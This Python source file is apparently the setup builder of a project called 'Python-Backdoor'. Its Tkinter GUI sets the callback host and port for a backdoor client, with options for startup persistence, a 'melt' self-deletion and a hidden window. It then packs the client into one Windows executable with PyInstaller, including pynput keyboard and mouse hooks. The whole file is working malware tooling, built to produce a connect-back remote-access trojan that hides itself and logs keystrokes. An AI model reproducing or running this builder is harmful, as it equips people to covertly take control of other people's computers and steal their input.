"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import platform
import threading
from tkinter import *
from tkinter.ttk import *
import tkinter.messagebox
from tkinter import scrolledtext
from tkinter import filedialog

import os
import subprocess
import socket
import sys
import urllib.request
import site


def null_callback():
    pass


def get_local_ip():
    try:
        # create a dummy socket to get local IP address
        _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _socket.connect(("google.com", 0))
        ip = _socket.getsockname()[0]
        _socket.close()
    except socket.error:
        tkinter.messagebox.showerror("Error", "You are not connected to the internet")
        sys.exit(0)

    return ip


def get_pyinstaller():
    user_path = site.getusersitepackages().split("\\")[:-1]
    user_path = "\\".join(user_path)

    for path in site.getsitepackages() + [site.getusersitepackages(), user_path]:
        _path = f"{path}\\Scripts\\pyinstaller.exe"
        if os.path.isfile(_path):
            return "\"" + _path + "\""

    tkinter.messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
    sys.exit(0)


def save_files(client_args):
    client_new_line = f"if __name__ == \"__main__\": \n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"

    main_match = "if __name__ == \"__main__\":"

    file = open("main_client.py", "r")
    file_contents = file.readlines()
    file.close()

    i = 0
    for i in range(0, len(file_contents)):
        if file_contents[i][:len(main_match)] == main_match:
            break

    file_contents = file_contents[:i]
    file_contents.append(client_new_line)

    file = open("main_client.py", "w")
    file.writelines(file_contents)
    file.close()


def check_windows():
    if not "windows" in platform.system().lower():
        tkinter.messagebox.showerror("Error", "You need a windows computer to build the client")
        sys.exit(0)


class Setup:
    def __init__(self):

        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
        check_windows()

        self.pyinstaller = get_pyinstaller()

        self.local_ip = get_local_ip()
        self.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
        self.loopback_ip = "127.0.0.1"
        self.host = self.local_ip

        self.root = Tk()
        self.melt = IntVar()
        self.add_startup = IntVar()
        self.is_console = IntVar()
        self.is_debug = IntVar()
        self.icon = IntVar()
        self.icon_path = None
        self.is_hostname = False
        self.log = ""

        self.create_ui()

    def create_ui(self):
        # dummy value
        self.root_log = Label()

        self.root.geometry("360x235")
        self.root.resizable(0, 0)
        self.root.title("Python backdoor setup")

        self.frame = Frame(self.root)
        self.frame.grid(row=0, column=0, padx=10, pady=10)

        self.host_frame = LabelFrame(self.frame, text="Host")
        self.host_frame.pack(side=TOP, anchor=NW)

        self.lt = Label(self.host_frame, text="Choose host:")
        self.lt.grid(row=0, column=0, padx=8, pady=5)

        self.host_cb = Combobox(self.host_frame,
                                values=["Local IP", "External IP", "Other IP", "DNS hostname", "Loopback"], width=20)
        self.host_cb.grid(column=1, row=0, pady=5, padx=8)
        self.host_cb.bind("<<ComboboxSelected>>", self.host_cb_callback)
        self.host_cb.current(0)

        self.host_widg = Label(self.host_frame, text=self.local_ip)
        self.host_widg.grid(column=2, row=0, padx=8, pady=5)

        self.port_lb = Label(self.host_frame, text="Choose port:")
        self.port_lb.grid(column=0, row=1, pady=8)

        self.port_et = Entry(self.host_frame, width=7)
        self.port_et.insert(END, "3000")
        self.port_et.grid(column=1, row=1, pady=8)

        self.misc_frame = LabelFrame(self.frame, text="Misc.")
        self.misc_frame.pack(side=LEFT)

        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup", variable=self.add_startup)
        self.startup_cb.grid(column=0, row=0, sticky=W)

        self.add_icon_cb = Checkbutton(self.misc_frame, text="Custom icon", variable=self.icon,
                                       command=self.add_icon_cb_callback)
        self.add_icon_cb.grid(column=0, row=1, sticky=W)

        self.melt_cb = Checkbutton(self.misc_frame, text="Melt file", variable=self.melt)
        self.melt_cb.grid(column=0, row=2, sticky=W)

        self.console_cb = Checkbutton(self.misc_frame, text="Console app", variable=self.is_console)
        self.console_cb.grid(column=0, row=4, sticky=W)

        self.debug_cb = Checkbutton(self.misc_frame, text="Pyinstaller debug", variable=self.is_debug, command=self.debug_cb_callback)
        self.debug_cb.grid(column=0, row=5, sticky=W)

        self.build_btn = Button(self.frame, text="Build", width=36, command=self.build_btn_callback)
        self.build_btn.pack(padx=8, side=BOTTOM, anchor=W)

        self.root.mainloop()

    def default_build_ui_state(self):
        self.root.protocol("WM_DELETE_WINDOW", self.root.destroy)
        self.build_btn["state"] = "enabled"
        self.build_btn.config(text="Build")

    def disable_build_ui(self):
        self.build_btn["state"] = "disabled"
        self.build_btn.config(text="Please wait...")
        self.root_log.destroy()
        self.root.protocol("WM_DELETE_WINDOW", null_callback)

    def create_log_ui(self, log):
        self.root_log = Toplevel(self.root)
        self.root_log.title("Pyinstaller log")
        self.root_log.geometry("500x300")

        self.root_log_frame = LabelFrame(self.root_log, text="Log")
        self.root_log_frame.pack(padx=8, pady=8, fill=BOTH, expand=YES)

        self.log_sbtxt = scrolledtext.ScrolledText(self.root_log_frame)
        self.log_sbtxt.pack(padx=4, pady=4, fill=BOTH, expand=YES)

        self.log_sbtxt.insert(INSERT, log)
        self.log_sbtxt.configure(state="disabled")

    def debug_cb_callback(self):
        if bool(self.is_debug.get()):
            self.is_console.set(1)
            self.console_cb.config(state=DISABLED)
        else:
            self.console_cb.config(state=ACTIVE)

    def build_btn_callback(self):
        port = self.port_et.get()

        if not isinstance(self.host_widg, Entry):
            self.host = self.host_widg["text"]
        else:
            self.host = self.host_widg.get()

        if not port.isdigit():
            tkinter.messagebox.showerror("Build", "You must enter numeric value for the port")
        elif not 1024 <= int(port) <= 65535:
            tkinter.messagebox.showerror("Build", "Please enter a port number between 1024 and 65535")
        else:
            self.disable_build_ui()

            client_args = \
                [f"'{self.host}'", str(port), str(self.is_hostname), str(bool(self.add_startup.get())),
                 str(bool(self.melt.get()))]

            save_files(client_args)

            icon_command = ""
            windowed = "--windowed"
            debug_command = ""

            if bool(self.is_console.get()):
                windowed = ""

            if self.icon_path:
                icon_command = f"--icon {self.icon_path}"

            if bool(self.is_debug.get()):
                debug_command = "--debug=all --log-level DEBUG"

            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} --onefile -y " \
                          f"--clean --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 " \
                          f"--exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter " \
                          f"--exclude-module tkinter --exclude-module Tkinter "

            def run_command():
                self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                log, log = self.command.communicate()
                self.default_build_ui_state()
                self.create_log_ui(log)

            threading.Thread(target=run_command, daemon=False).start()

    def add_icon_cb_callback(self):
        if self.icon.get() == 1:
            path = filedialog.askopenfile(parent=self.root, title="Choose icon", filetypes=[("icon", ".ico")])

            if path is not None:
                self.icon_path = "\"" + path.name + "\""
                path.close()
            else:
                self.icon.set(0)
        else:
            self.icon_path = None

    def host_cb_callback(self, evt):
        value = evt.widget.get()

        if self.host_widg.winfo_exists() is not None:
            self.host_widg.destroy()

        if value in ["Local IP", "External IP", "Loopback"]:
            self.host_widg = Label(self.host_frame)
            self.host_widg.grid(column=2, row=0, padx=8, pady=5)
        else:
            self.host_widg = Entry(self.host_frame, width=12)
            if value == "DNS hostname":
                self.host_widg.insert(END, "hostname")
                self.is_hostname = True
            else:
                self.host_widg.insert(END, "IP")
            self.host_widg.grid(column=2, row=0, padx=8, pady=5)

        match value:
            case "Local IP":
                self.host_widg["text"] = self.local_ip
            case "External IP":
                self.host_widg["text"] = self.external_ip
            case "Loopback":
                self.host_widg["text"] = self.loopback_ip


if __name__ == "__main__":
    Setup()
